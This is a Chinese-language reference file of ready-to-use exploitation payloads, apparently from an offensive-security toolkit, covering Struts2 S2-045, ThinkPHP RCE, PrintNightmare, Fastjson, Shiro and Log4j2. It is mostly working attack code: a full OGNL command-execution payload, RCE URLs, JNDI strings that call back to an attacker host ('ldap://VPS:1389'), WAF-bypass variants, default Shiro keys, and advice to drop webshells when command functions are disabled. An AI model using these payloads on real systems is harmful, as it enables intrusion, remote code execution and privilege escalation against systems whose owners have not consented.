# JVM / PHP 中间件漏洞利用载荷

被 `injection-payloads`、`web-vuln-payloads`、`cn-oa-exploit` 引用。

> **本仓此前完全空缺的四类**（1.1.123 覆盖矩阵实测命中 0）：
> Struts2、ThinkPHP、PrintNightmare、IEC-104。前三类在本文，IEC-104 见
> `references/industrial-protocol-deep.md`。
>
> 这四类不是"冷门"，是**中国企业靶标的高频入口**：Struts2 在国内政企系统里存量极大，
> ThinkPHP 是国产 CMS 的事实标准，PrintNightmare 是 Windows 打印服务的通用提权面。

---

## 一、Struts2（S2-xxx 系列）—— 国内政企存量最大

### 先判有没有 Struts2

```bash
# 判据 1：URL 扩展名（.action / .do 是老版本特征）
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/index.action"
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/login.do"

# 判据 2：报错页含 Struts2 特征
curl -s "http://TARGET/nonexistent.action" | grep -iE "struts|ognl|devMode"

# 判据 3：OGNL 探测（S2-045 的 content-type 注入点）
curl -s -X POST "http://TARGET/" \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}" \
  -d "x=1" | head -5
# 判据：返回 500 且报错含 ognl = 有 OGNL 执行面
```

**版本判定**（决定打哪个 CVE）：

| S2 编号 | 影响版本 | 触发点 | CVSS |
| --- | --- | --- | --- |
| S2-045 | 2.3.5-2.3.31, 2.5-2.5.10 | Content-Type 头 OGNL | 10.0 |
| S2-046 | 同上 | filename 参数 OGNL | 10.0 |
| S2-048 | 2.3.x | Struts1 插件 | 9.0 |
| S2-052 | 2.1.2-2.3.33, 2.5-2.5.12 | REST 插件 XStream | 9.8 |
| S2-057 | ≤2.3.34, ≤2.5.16 | namespace OGNL（`alwaysSelectFullNamespace`） | 9.8 |
| S2-059 | ≤2.5.20 | 标签属性二次求值 | 8.8 |
| S2-061 | ≤2.5.25 | 同上（059 修复不全） | 9.8 |
| S2-062 | ≤2.5.26 | 同上 | 9.8 |

### S2-045 的完整可执行载荷

```bash
# 关键：Content-Type 头里塞 OGNL，`#_memberAccess` 打开后才允许执行方法
PAYLOAD='%{(#_='"'"'multipart/form-data'"'"').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['"'"'com.opensymphony.xwork2.ActionContext.container'"'"']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"'"'id'"'"').(#iswin=(@java.lang.System@getProperty('"'"'os.name'"'"').toLowerCase().contains('"'"'win'"'"'))).(#cmds=(#iswin?{'"'"'cmd'"'"','"'"'/c'"'"',#cmd}:{'"'"'/bin/bash'"'"','"'"'-c'"'"',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'

curl -s -X POST "http://TARGET/" -H "Content-Type: $PAYLOAD" -d "x=1"
# 判据：**响应体里回显了 `id` 的输出**（uid=... / 或 Windows 的 用户信息）
# 只说 500 不算 —— 大量已修补版本也回 500（parse 失败）
```

**三类假成功**：
1. 回 500 但 body 是 Struts 的错误页 → OGNL 被过滤，没执行。
2. 回 200 且 body 正常 → 注入点不存在（Content-Type 被中间件重写）。
3. **回显出 `id` 但是 WAF 的假响应** → 必须核对 UID/GID 数字是不是真实系统值。

---

## 二、ThinkPHP（国内 CMS 事实标准）

### 版本判定

```bash
# 判据 1：特征路径
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/index.php?s=/index/index"
# ThinkPHP 的 pathinfo 模式；5.x 常见 `?s=`

# 判据 2：报错页
curl -s "http://TARGET/index.php?s=/index/think\app/invokefunction" | grep -i "ThinkPHP"
# 判据 3：静态资源路径含版本
curl -s "http://TARGET/" | grep -oE "ThinkPHP[ /]?[0-9]\.[0-9]" | head -2
```

### 五个高价值 RCE（按版本对号）

| 编号 | 影响版本 | 触发点 |
| --- | --- | --- |
| 5.0.23 补丁绕过 | 5.0.22-5.0.23 | `s=index/\think\app/invokefunction` |
| 5.1.x 核心 | 5.1.0-5.1.30 | 同上（payload 差异在参数名） |
| 5.0.5-5.0.22 | 该区间 | `s=index/think\request/input` |
| 6.x 多语言 | 6.0.x | `lang` 参数本地文件包含 → RCE |
| 3.2.x | ≤3.2.4 | `index.php/module/action/param` |

```bash
# 5.0.23 的 invokefunction（最常打的一个）
curl -s "http://TARGET/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
# 判据：body 里有 `uid=` 输出

# 5.0.23 的另一种（assert）
curl -s "http://TARGET/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
# 判据：phpinfo 页面 = 有执行权（比 system 更不容易被 disable_functions 拦）

# 5.1.x（参数名是 function，但路径不同）
curl -s "http://TARGET/index.php?s=/index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
```

**验伤要点**：**先打 `phpinfo` 再打 `system`**。
因为很多生产环境 `disable_functions` 关了 `system/exec/shell_exec`，
`phpinfo` 能出说明 RCE 面在，只是命令执行被禁 —— 这时转
`call_user_func_array` 打 `file_get_contents`/`file_put_contents` 落马，
而不是继续试别的命令执行函数（试一个被禁一个，全是噪音）。

---

## 三、PrintNightmare（CVE-2021-34527）—— Windows 打印服务提权

> **为什么单列**：本仓 `privesc-persistence` 的 Windows 提权路径里**完全没有这一类**（1.1.123 实测命中 0）。
> 它是 Windows 上**不需要任何前置权限**就能拿 SYSTEM 的少数路径之一，
> 而且 2021 年披露后大量未打补丁的内网机器仍然存在。

### 判据：目标有没有打补丁

```powershell
# 1) 打印服务是否在跑（PrintNightmare 的前提）
Get-Service Spooler | Select-Object Status
# Running = 有攻击面（默认就是 Running）

# 2) 查补丁（KB5004945 / KB5005010 等）
Get-HotFix | Where-Object { $_.HotFixID -match "KB5004945|KB5005010|KB5005565" }
# 有 = 已修；无 = 可能可利用

# 3) 查注册表的关键项（驱动签名策略）
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" /v RestrictDriverInstallationToAdministrators
# 返回 1 = 已加固；"找不到" 或 0 = 可利用
```

### 利用形态（两种，按权限分）

```text
形态 A：本地提权（先有普通用户）
  用 CVE-2021-1675 / CVE-2021-34527 的本地版本（影响所有未打 2021-06/07 补丁的 Windows），
  让 Spooler 以 SYSTEM 身份
  加载你指定的 DLL（打印机驱动），DLL 里的代码以 SYSTEM 执行。

形态 B：远程（有域凭据或能访问 445/135）
  RpcAddPrinterDriverEx 让目标 Spooler 从你的 UNC 路径加载驱动
  → 目标机以 SYSTEM 加载你的 DLL
  → 这一条在域环境里可以从普通域用户直接拿域内任意机器的 SYSTEM
```

**这一类的验伤判据（与别的提权不同，必须带副作用）**：
Spooler 只加载**结构合法的打印机驱动 DLL**，不是任意 DLL。
所以「DLL 被加载」和「你的代码执行了」是两件事 —— 判据只能是：
**在 DLL 里写一个明显副作用（在 `C:\Windows\Temp\` 下建一个随机名文件），
然后去目标机确认那个文件真的存在**。文件不存在 = 代码没跑（即使 Spooler 没崩、回显成功）。
第二条判据：`whoami` 回显 `nt authority\system`。
**Spooler 崩溃不是战果**：它会让该机所有打印停止，是生产事故。

```bash
# 远程形态的验证（用 impacket 的 rpcdump 看打印接口是否可达）
python3 -m impacket.examples.rpcdump "corp/user:pass@TARGET" 2>/dev/null | grep -i "spooler\|MS-RPRN"
# 判据：能看到 MS-RPRN 或 spoolss 接口 = 攻击面在
```

**验伤（最容易假成功的地方）**：
1. **DLL 加载了但代码没执行** —— 驱动加载要求 DLL 是合法的打印机驱动结构，
   不是任意 DLL。判据：你的 DLL 里写一个明显的副作用（创建一个文件），
   **去目标机上看那个文件在不在**。
2. **Spooler 崩了** —— 打错了版本或 DLL 结构不对。Spooler 崩溃后
   所有打印功能停止（生产环境影响），**这是事故不是战果**。
3. **回显成功但没提权** —— 必须 `whoami` 确认是 `nt authority\system`。

**纪律**：PrintNightmare 会让 Spooler 加载任意 DLL，一旦 DLL 有问题就崩 Spooler。
在生产打印服务器上做这个之前，先确认「Spooler 崩了对方能不能接受」。

---

## 四、Fastjson / Shiro / Log4j2 的完整链（补本仓缺口）

本仓 `cn-oa-exploit` 只写了「识别 + 默认 key 爆破」，缺**完整可用链**。这里补齐。

### Fastjson（1.2.24 / 1.2.47 / 1.2.68 / 1.2.80 四个已知绕过）

```bash
# 判据：目标接受 JSON 且报错含 fastjson
curl -s -X POST "http://TARGET/api" -H "Content-Type: application/json" \
  -d '{"@type":"java.lang.AutoCloseable"' -w "\n%{http_code}\n"
# 报错含 `autoType is not support` 或 `fastjson` = 是 Fastjson

# 1.2.24 直接用 JdbcRowSetImpl（JNDI 注入）
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://VPS:1389/Exploit","autoCommit":true}

# 1.2.47 用 java.lang.Class 绕过 autoType 检查
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
 "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://VPS:1389/Exploit","autoCommit":true}}

# 1.2.68 用 AutoCloseable + expectClass
{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl",...}
```

**验伤**：**必须看到 VPS 上的 LDAP 回连**（`nc -lvnp 1389` 收到连接）。
「请求返回报错」不算 —— autoType 被禁时也报错，但不会发起 JNDI 请求。
判据：你的 LDAP 监听端**收到了目标发来的连接**，且 JVM 版本允许远程 codebase
（JDK 8u191+ 默认 `com.sun.jndi.ldap.object.trustURLCodebase=false`，
这时要用 LDAP 返回本地已存在的 gadget，而不是远程 class）。

### Shiro（rememberMe 反序列化）

```bash
# 判据 1：响应头有 rememberMe=deleteMe
curl -s -I "http://TARGET/" | grep -i "rememberMe=deleteMe"
# 有 = 是 Shiro

# 判据 2：默认 key 爆破（Shiro 550）
# 用 shiro_attack / ysoserial 的 CB 链，AES 加密后塞 Cookie
java -jar shiro_attack.jar -u http://TARGET/ -k "kPH+bIxk5D2deZiIxcaaaA=="
# 常用默认 key：kPH+bIxk5D2deZiIxcaaaA== / 2AvVhdsgUs0FSA3SDFAdag== 等

# 判据 3：爆破成功 = 返回 200 且页面含你的回显
```

**Shiro 的三个坑**：
1. **默认 key 改了** —— 很多国产系统改过 key。爆破不到就走另外两条：
   · **CVE-2020-11989**（Shiro < 1.5.3，路径绕过鉴权，不需要 key）
   · **CVE-2016-4437**（Shiro < 1.2.5，rememberMe padding oracle，可离线解出明文再伪造）
   **验伤**：11989 的判据是「不带 Cookie 能访问本应鉴权的接口」；
   4437 的判据是「用 oracle 解出的明文能构造出被接受的 Cookie」——
   两者都不是「爆破器没报错」就能算成功。
2. **AES 模式是 CBC，IV 固定** —— payload 长度必须是 16 的倍数（不足要 padding）。
3. **回显要用链里的 gadget 自带** —— 不能拿 system 命令回显（Tomcat 里没有对应 Filter）。

### Log4j2（CVE-2021-44228，影响 2.0-beta9 ~ 2.14.1；2.15.0 部分修复、2.17.0 完整修复）

```bash
# 判据：任何能写入日志的输入点都试一次
curl -s "http://TARGET/" -H 'User-Agent: ${jndi:ldap://VPS:1389/a}'
curl -s "http://TARGET/api" -H 'X-Api-Version: ${jndi:ldap://VPS:1389/a}'
curl -s -X POST "http://TARGET/login" -d 'username=${jndi:ldap://VPS:1389/a}&password=x'

# 绕 WAF 的变形（真实环境常用）
${${lower:j}ndi:ldap://VPS:1389/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://VPS:1389/a}
${jndi:${lower:l}dap://VPS:1389/a}
```

**验伤**：**VPS 的 LDAP/HTTP 收到回连**才是命中。
「页面正常返回」完全不能说明 —— Log4j 的注入点在日志里，用户侧看不到任何变化。

---

## 五、这四类的共同验伤纪律

| 类 | 假成功形态 | 唯一可靠判据 |
| --- | --- | --- |
| Struts2 | 500 但 OGNL 被过滤 | 响应体里**有命令输出**（uid= 或 Windows 用户名） |
| ThinkPHP | 200 但 system 被禁 | 先 phpinfo 确认面在，再换函数 |
| PrintNightmare | DLL 加载但代码未执行 | **目标机上出现你写的副作用文件** + `whoami` |
| Fastjson/Shiro/Log4j | 报错但没回连 | **VPS 监听端收到连接** |

**通用原则**：这五类的「请求成功」几乎都不能作为成功证据 ——
它们的共同点是**服务端行为发生在用户看不到的地方**（日志、驱动加载、JNDI 解析、反序列化）。
所以验伤必须是**带外**的（回连 / 副作用文件 / 命令回显），不能看 HTTP 状态码。